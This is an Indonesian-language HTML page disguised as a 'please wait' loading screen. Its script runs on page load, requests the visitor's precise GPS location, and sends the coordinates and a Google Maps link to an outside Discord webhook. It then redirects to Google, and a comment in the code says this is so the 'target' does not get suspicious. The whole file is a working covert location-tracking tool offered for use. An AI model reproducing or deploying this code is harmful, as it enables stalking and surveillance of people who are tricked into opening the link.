<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Halaman...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f4; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p style="margin-left: 10px;">Mohon tunggu...</p>

    <script>
        const discordWebhookUrl = "URL_WEBHOOK_DISCORD_ANDA";

        function sendToDiscord(message) {
            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            }).then(() => {
                // Setelah terkirim, arahkan ke Google agar tidak curiga
                window.location.href = "https://www.google.com";
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                        
                        const pesan = `**📍 Lokasi Baru Ditemukan!**\n` +
                                      `**Latitude:** \`${lat}\`\n` +
                                      `**Longitude:** \`${lon}\`\n` +
                                      `**Akurasi:** \`${accuracy} meter\`\n` +
                                      `**Link Maps:** ${mapsUrl}`;
                        
                        sendToDiscord(pesan);
                    },
                    (error) => {
                        sendToDiscord("❌ Target menolak akses lokasi (Block).");
                    },
                    { enableHighAccuracy: true } // Memaksa GPS agar akurat
                );
            } else {
                sendToDiscord("❌ Browser tidak mendukung Geolocation.");
            }
        }

        window.onload = getLocation;
    </script>
</body>
</html>
